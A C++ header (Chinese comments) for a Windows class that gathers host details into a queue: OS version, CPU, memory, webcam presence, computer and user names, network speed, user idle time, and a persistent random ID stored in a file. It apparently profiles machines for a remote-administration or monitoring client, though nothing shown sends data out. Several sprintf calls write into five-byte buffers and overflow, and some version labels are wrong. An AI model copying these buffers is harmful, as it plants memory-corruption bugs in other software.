#pragma once
#include "pch.h"
#include <iostream>
#include <WINDOWSX.H>
#include <windows.h>
#include <string>
#include<stdio.h>
#include<stdlib.h>
#include <cstdlib>
#include<cmath>
#include <wincrypt.h>
#include <intrin.h>

//视频
#include <vfw.h>

//获取下载和上传速度
#include <IPHlpApi.h>   
#pragma comment(lib, "IPHlpApi.lib")
#include "ThreadSafeQueue.cpp"
#include"mStruct.cpp"
using namespace std;
//用来存储eax,ebx,ecx,edx四个寄存器的信息

class infoManager {

public:
	static ThreadSafeQueue<minfo> infoQueue;

	void getAll() {
		this->getComputerName();
		this->getCpuInfo();
		this->getCPURate();
		this->GetLastInputTime();
		this->getMemRate();
		this->getMemTotal();
		this->getSpeed();
		this->getUserName();
		this->getVersion();
		this->haveWebCam();
		this->getIDCode();
	}

	//系统版本 1
	void getVersion()//系统版本
	{
		std::string vname;
		//先判断是否为win8.1或win10  
		typedef void(__stdcall*NTPROC)(DWORD*, DWORD*, DWORD*);
		SYSTEM_INFO si;
		DWORD dwType;
		HINSTANCE hinst = LoadLibrary(TEXT("ntdll.dll"));
		DWORD dwMajor, dwMinor, dwBuildNumber;
		NTPROC proc = (NTPROC)GetProcAddress(hinst, "RtlGetNtVersionNumbers");
		proc(&dwMajor, &dwMinor, &dwBuildNumber);
		FreeLibrary(hinst);

		OSVERSIONINFOEX os = { 0 };
		os.dwOSVersionInfoSize = sizeof(OSVERSIONINFOEX);

		GetVersionEx((OSVERSIONINFO *)&os);

		if (os.dwMajorVersion == 6)
		{
			if (os.dwMinorVersion == 0)
			{
				if (os.wProductType == VER_NT_WORKSTATION)
					vname += "Windows Vista ";
				else vname += "Windows Server 2008 ";
			}
			else if (os.dwMinorVersion == 1)
			{
				if (os.wProductType == VER_NT_WORKSTATION)
					vname += "Windows 7 ";
				else vname += "Windows Server 2008 R2 ";
			}
			else if (os.dwMinorVersion == 2)
			{
				if (dwMajor == 10) {
					if (os.wProductType == VER_NT_WORKSTATION)
						vname += "Windows 10 ";
					else vname += "Windows Server 2016 ";
				}
				else if (dwMinor == 3) {
					if (os.wProductType == VER_NT_WORKSTATION)
						vname += "Windows 8.1 ";
					else vname += "Windows Server 2012 R2 ";

				}
				else {
					if (os.wProductType == VER_NT_WORKSTATION)
						vname += "Windows 8 ";
					else vname += "Windows Server 2010 R2 ";
				}
			}

			typedef BOOL(WINAPI *PGPI)(DWORD, DWORD, DWORD, DWORD, PDWORD);
			PGPI pGPI;

			pGPI = (PGPI)GetProcAddress(
				GetModuleHandle(TEXT("kernel32.dll")),
				"GetProductInfo");

			pGPI(os.dwMajorVersion, os.dwMinorVersion, 0, 0, &dwType);

			switch (dwType)
			{
			case PRODUCT_ULTIMATE:
				vname += "Ultimate ";
				break;
			case PRODUCT_PROFESSIONAL:
				vname += "Professional ";
				break;
			case PRODUCT_HOME_PREMIUM:
				vname += "Home Premium ";
				break;
			case PRODUCT_HOME_BASIC:
				vname += "Home Basic ";
				break;
			case PRODUCT_ENTERPRISE:
				vname += "Enterprise ";
				break;
			case PRODUCT_BUSINESS:
				vname += "Business ";
				break;
			case PRODUCT_STARTER:
				vname += "Starter ";
				break;
			case PRODUCT_CLUSTER_SERVER:
				vname += "Cluster Server ";
				break;
			case PRODUCT_DATACENTER_SERVER:
				vname += "Datacenter ";
				break;
			case PRODUCT_DATACENTER_SERVER_CORE:
				vname += "Datacenter Edition (core installation) ";
				break;
			case PRODUCT_ENTERPRISE_SERVER:
				vname += "Enterprise ";
				break;
			case PRODUCT_ENTERPRISE_SERVER_CORE:
				vname += "Enterprise Edition (core installation) ";
				break;
			case PRODUCT_ENTERPRISE_SERVER_IA64:
				vname += "Enterprise Edition for Itanium-based Systems ";
				break;
			case PRODUCT_SMALLBUSINESS_SERVER:
				vname += "Small Business Server ";
				break;
			case PRODUCT_SMALLBUSINESS_SERVER_PREMIUM:
				vname += "Small Business Server Premium Edition ";
				break;
			case PRODUCT_STANDARD_SERVER:
				vname += "Standard ";
				break;
			case PRODUCT_STANDARD_SERVER_CORE:
				vname += "Standard Edition (core installation) ";
				break;
			case PRODUCT_WEB_SERVER:
				vname += "Web Server ";
				break;
			}
		}

		else if (os.dwMajorVersion == 5 && os.dwMinorVersion == 2)
		{
			if (GetSystemMetrics(SM_SERVERR2))
				vname += "Windows Server 2003 R2, ";
			else if (os.wSuiteMask & VER_SUITE_STORAGE_SERVER)
				vname += "Windows Storage Server 2003";
			else if (os.wSuiteMask & VER_SUITE_WH_SERVER)
				vname += "Windows Home Server";
			else if (os.wProductType == VER_NT_WORKSTATION &&
				si.wProcessorArchitecture == PROCESSOR_ARCHITECTURE_AMD64)
			{
				vname += "Windows XP Professional x64 Edition";
			}
			else vname += "Windows Server 2003, ";

			// Test for the server type.
			if (os.wProductType != VER_NT_WORKSTATION)
			{
				if (si.wProcessorArchitecture == PROCESSOR_ARCHITECTURE_IA64)
				{
					if (os.wSuiteMask & VER_SUITE_DATACENTER)
						vname += "Datacenter Edition for Itanium-based Systems";
					else if (os.wSuiteMask & VER_SUITE_ENTERPRISE)
						vname += "Enterprise Edition for Itanium-based Systems";
				}

				else if (si.wProcessorArchitecture == PROCESSOR_ARCHITECTURE_AMD64)
				{
					if (os.wSuiteMask & VER_SUITE_DATACENTER)
						vname += "Datacenter x64 Edition";
					else if (os.wSuiteMask & VER_SUITE_ENTERPRISE)
						vname += "Enterprise x64 Edition";
					else vname += "Standard x64 Edition";
				}

				else
				{
					if (os.wSuiteMask & VER_SUITE_COMPUTE_SERVER)
						vname += "Compute Cluster Edition";
					else if (os.wSuiteMask & VER_SUITE_DATACENTER)
						vname += "Datacenter Edition";
					else if (os.wSuiteMask & VER_SUITE_ENTERPRISE)
						vname += "Enterprise Edition";
					else if (os.wSuiteMask & VER_SUITE_BLADE)
						vname += "Web Edition";
					else vname += "Standard Edition";
				}
			}
		}

		else if (os.dwMajorVersion == 5 && os.dwMinorVersion == 1)
		{
			vname += "Windows XP ";
			if (os.wSuiteMask & VER_SUITE_PERSONAL)
				vname += "Home Edition";
			else vname += "Professional";
		}

		else if (os.dwMajorVersion == 5 && os.dwMinorVersion == 0)
		{
			vname += "Windows 2000 ";

			if (os.wProductType == VER_NT_WORKSTATION)
			{
				vname += "Professional";
			}
			else
			{
				if (os.wSuiteMask & VER_SUITE_DATACENTER)
					vname += "Datacenter Server";
				else if (os.wSuiteMask & VER_SUITE_ENTERPRISE)
					vname += "Advanced Server";
				else vname += "Server";
			}
		}

		if (isWow64()) {
			vname += "x64";
		}
		else {
			vname += "x32";
		}
		minfo tmp;
		tmp.infoIndex = 1;
		tmp.data = vname;
		infoQueue.push(tmp);

		//cout << vname << endl;

	}

	//CPU信息 2
	void getCpuInfo()
	{
		int cpuInfo[4] = { -1 };
		char cpu_manufacture[32] = { 0 };
		char cpu_type[32] = { 0 };
		char cpu_freq[32] = { 0 };

		__cpuid(cpuInfo, 0x80000002);
		memcpy(cpu_manufacture, cpuInfo, sizeof(cpuInfo));

		__cpuid(cpuInfo, 0x80000003);
		memcpy(cpu_type, cpuInfo, sizeof(cpuInfo));

		__cpuid(cpuInfo, 0x80000004);
		memcpy(cpu_freq, cpuInfo, sizeof(cpuInfo));

		string str_manufacture = cpu_manufacture;
		string str_type = cpu_type;
		string str_frequency = cpu_freq;

		minfo tmp;
		tmp.infoIndex = 2;
		tmp.data = str_manufacture + str_type + str_frequency;
		infoQueue.push(tmp);
	}

	//内存总量 3
	void getMemTotal() {//获取内存总量
		MEMORYSTATUSEX memoryStatus;
		memoryStatus.dwLength = sizeof(memoryStatus);
		//获取当前内存状态
		GlobalMemoryStatusEx(&memoryStatus);

		//double a = memoryStatus.ullTotalPhys ;
		string memTotal = ByteConvert(memoryStatus.ullTotalPhys);

		minfo tmp;
		tmp.infoIndex = 3;
		tmp.data = memTotal;
		infoQueue.push(tmp);

		

	}

	//内存使用率 4
	void getMemRate() {
		MEMORYSTATUSEX memoryStatus;
		memoryStatus.dwLength = sizeof(memoryStatus);
		//获取当前内存状态
		GlobalMemoryStatusEx(&memoryStatus);
		char buffer[5];
		sprintf(buffer, "%d%%", (short)memoryStatus.dwMemoryLoad);
		string str = buffer;
		minfo tmp;
		tmp.infoIndex = 4;
		tmp.data = str;
		infoQueue.push(tmp);
	}

	//是否存在摄像头 5
	void haveWebCam()//是否存在摄像头
	{
		BOOL bRet = FALSE;
		char lpszName[100], lpszVer[50];
		for (int i = 0; i < 10 && !bRet; i++)
		{
			bRet = capGetDriverDescription(i, lpszName, sizeof(lpszName), lpszVer, sizeof(lpszVer));
		}
		minfo tmp;
		tmp.infoIndex = 5;
		if (bRet) {
			tmp.data = "True";
		}
		else {
			tmp.data = "False";
		}
		infoQueue.push(tmp);
	}

	//计算机名 6
	void getComputerName() {
		TCHAR szComputerName[MAX_COMPUTERNAME_LENGTH + 1];
		DWORD len = MAX_COMPUTERNAME_LENGTH + 1;
		GetComputerName(szComputerName, &len);
		minfo tmp;
		tmp.infoIndex = 6;
		tmp.data = szComputerName;
		infoQueue.push(tmp);
	}

	//用户名 7
	void getUserName() {

		TCHAR szUserName[MAX_COMPUTERNAME_LENGTH + 1];
		DWORD len = MAX_COMPUTERNAME_LENGTH + 1;
		GetUserName(szUserName, &len);
		minfo tmp;
		tmp.infoIndex = 7;
		tmp.data = szUserName;
		infoQueue.push(tmp);

	}

	//下载 8 上传 9
	void getSpeed() {
		DWORD dwbpsRecv, dwbpsSend;
		GetSysNetworkFlowByMidTable(dwbpsRecv, dwbpsSend);
		string speed[2];
		speed[0] = ByteConvert(dwbpsRecv);
		speed[1] = ByteConvert(dwbpsSend);

		minfo tmp;
		tmp.infoIndex = 8;
		tmp.data = speed[0];
		infoQueue.push(tmp);

		minfo tmp2;
		tmp2.infoIndex = 9;
		tmp2.data = speed[1];
		infoQueue.push(tmp2);

	}

	//CPU使用率 10
	void getCPURate() {
		FILETIME preidleTime;                //储存以前的时间信息
		FILETIME prekernelTime;
		FILETIME preuserTime;

		FILETIME idleTime;                //储存现在的时间信息
		FILETIME kernelTime;
		FILETIME userTime;
		
		GetSystemTimes(&preidleTime, &prekernelTime, &preuserTime);
		Sleep(200);
		GetSystemTimes(&idleTime, &kernelTime, &userTime);        //得到另一组数据

		__int64 idle = CompareFileTime(preidleTime, idleTime);        //通过自定义的函数来比较这段时间内cpu空闲的时间
		__int64 kernel = CompareFileTime(prekernelTime, kernelTime);    //通过自定义的函数来比较这段时间内cpu内核使用的时间
		__int64 user = CompareFileTime(preuserTime, userTime);        //通过自定义的函数来比较这段时间内cpu用户代码使用的时间

		double cpuRate = (kernel + user - idle) *100.0 / (kernel + user);    //计算cpu使用率
		char buffer[5];
		sprintf(buffer, "%.2lf%%", cpuRate);

		minfo tmp;
		tmp.infoIndex = 10;
		tmp.data = buffer;
		infoQueue.push(tmp);
	}

	//获得上次按键的时间，用于判断离开时间 11
	void GetLastInputTime()
	{
		LASTINPUTINFO lpi;
		DWORD dwTime = 0;
		lpi.cbSize = sizeof(lpi);
		GetLastInputInfo(&lpi);
		dwTime = ::GetTickCount() - lpi.dwTime;
		//char tmpchar[9];
		//for (int i = 0; i < 8; i++) {
		//	tmpchar[i] = dwTime % 0x100;
		//	dwTime /= 0x100;
		//}
		//tmpchar[8] = 0;
		minfo tmp;
		tmp.infoIndex = 11;
		tmp.data = to_string(dwTime);
		
		infoQueue.push(tmp);

	}
	
	//生成和获得标识码 12
	void getIDCode() {
		FILE* fp = nullptr;
		long size = 0;
		fp = fopen("2CFD5B39089F828DAAE3E5AAD0BC607D.txt", "r");
		if (fp != nullptr) {
			fseek(fp, 0, SEEK_END);
			size = ftell(fp);
			rewind(fp);
			if (size >= 32) {
				char* data = new char[33];
				int l = 0;
				while (1) {
					l += fread(data, 1, 32, fp);
					if (feof(fp) || l >= 32)break;
				}
				data[32] = 0;
				if (l == 32) {
					minfo tmp;
					tmp.infoIndex = 12;
					tmp.data = data;
					infoQueue.push(tmp);
					fclose(fp);
					return;
				}
			}
		}
		

		fp = fopen("2CFD5B39089F828DAAE3E5AAD0BC607D.txt", "w");
		if (fp == nullptr)return;
		string idcode = "";

		HCRYPTPROV handle = NULL;
		CryptAcquireContext(
			(HCRYPTPROV*)&handle, NULL, NULL,
			PROV_RSA_FULL, 0
		);
		unsigned char ret = 0;
		for (int i = 0; i < 32; i++) {
			CryptGenRandom(handle, sizeof(ret), (BYTE*)&ret);
			idcode += (char)((ret % 94) + 33);
		}
		CryptReleaseContext(handle, 0);

		fwrite(idcode.c_str(), 32, 1, fp);
		fclose(fp);
		getIDCode();
		return;

	}

private:
	
	__int64 CompareFileTime(FILETIME time1, FILETIME time2)    //得到两个结构体中的时间只差
	{
		__int64 a = time1.dwHighDateTime << 32 | time1.dwLowDateTime;    //<<32这步是为了把这高位时间移动到高位去,因为原有的数据是分两步份储存的
		__int64 b = time2.dwHighDateTime << 32 | time2.dwLowDateTime;

		return   (b - a);       //返回时间之差
	}
	
	BOOL isWow64()
	{
		typedef BOOL(WINAPI *LPFN_ISWOW64PROCESS) (HANDLE, PBOOL);
		LPFN_ISWOW64PROCESS fnIsWow64Process;
		BOOL bIsWow64 = FALSE;
		fnIsWow64Process = (LPFN_ISWOW64PROCESS)GetProcAddress(GetModuleHandle(TEXT("kernel32")), "IsWow64Process");
		if (NULL != fnIsWow64Process)
		{
			fnIsWow64Process(GetCurrentProcess(), &bIsWow64);
		}
		return bIsWow64;
	}

	BOOL getNtVersionNumbers(DWORD&dwMajorVer, DWORD& dwMinorVer, DWORD& dwBuildNumber)//版本信息
	{
		BOOL bRet = FALSE;
		HMODULE hModNtdll = NULL;
		if (hModNtdll = ::LoadLibraryW(L"ntdll.dll"))
		{
			typedef void (WINAPI *pfRTLGETNTVERSIONNUMBERS)(DWORD*, DWORD*, DWORD*);
			pfRTLGETNTVERSIONNUMBERS pfRtlGetNtVersionNumbers;
			pfRtlGetNtVersionNumbers = (pfRTLGETNTVERSIONNUMBERS)::GetProcAddress(hModNtdll, "RtlGetNtVersionNumbers");
			if (pfRtlGetNtVersionNumbers)
			{
				pfRtlGetNtVersionNumbers(&dwMajorVer, &dwMinorVer, &dwBuildNumber);
				dwBuildNumber &= 0x0ffff;
				bRet = TRUE;
			}

			::FreeLibrary(hModNtdll);
			hModNtdll = NULL;
		}

		return bRet;
	}

	//获取发送字节数和接收字节数，自系统启动
	bool GetStatisticOfSysNetworkFlow(DWORD &dwbitTotalRecv, DWORD &dwbitTotalSend)
	{
		/*获取MIB-II接口表大小*/
		DWORD dwBufferLen = 0;
		GetIfTable(NULL, &dwBufferLen, 0);

		/*创建MIB-II接口表*/
		PMIB_IFTABLE pMibIfTable = (MIB_IFTABLE*)malloc(dwBufferLen);

		/*获取MIB-II接口表*/
		DWORD dwRet = GetIfTable(pMibIfTable, &dwBufferLen, 0);
		if (NO_ERROR != dwRet)
		{
			//std::cout << "GetIfTable != NO_ERROR, ErrorCode=" << dwRet << std::endl;
			free(pMibIfTable);
			return false;
		}

		dwbitTotalRecv = dwbitTotalSend = 0;

		/*多网卡*/
		for (int i = 0; i != pMibIfTable->dwNumEntries; ++i)
		{
			if (pMibIfTable->table[i].dwType <= 23)
			{
				dwbitTotalRecv += pMibIfTable->table[i].dwInOctets;
				dwbitTotalSend += pMibIfTable->table[i].dwOutOctets;
			}
		}

		free(pMibIfTable);
		return true;
	}

	//计算每秒发送字节数和每秒接收字节数
	bool GetSysNetworkFlowByMidTable(DWORD &dwbpsRecv, DWORD &dwbpsSend)
	{
		/*首次获取*/
		DWORD dwTotalRecv1 = 0, dwTotalSend1 = 0;
		if (!GetStatisticOfSysNetworkFlow(dwTotalRecv1, dwTotalSend1))
		{
			//printf("GetStatisticOfSysNetworkFlow == false\n");
			return false;
		}

		Sleep(1000);

		/*再取*/
		DWORD dwTotalRecv2 = 0, dwTotalSend2 = 0;
		if (!GetStatisticOfSysNetworkFlow(dwTotalRecv2, dwTotalSend2))
		{
			//printf("GetStatisticOfSysNetworkFlow == false\n");
			return false;
		}

		/*计算*/
		dwbpsRecv = (dwTotalRecv2 - dwTotalRecv1);
		dwbpsSend = (dwTotalSend2 - dwTotalSend1);

		return true;
	}
public:
	//输入Byte，输出换算后的的存储大小
	string ByteConvert(long long byteSize) {
		if (byteSize <= 0) return "0.00 B";
		int i = -1;

		string unit[] = { " B", " KB", " MB", " GB", " TB", " PB", " EB", " ZB", " YB" };
		long long k = byteSize;
		//cout << "k "<<k << endl;
		while (k>0) {
			k /= 1024;
			i++;
		}
		//cout << "i" << i << endl;
		i = i % 9;
		float t = byteSize / pow(1024, i);
		
		char buf[10] = {0};
		sprintf(buf, "%.2f", t);
		
		return buf + unit[i];
	}
};
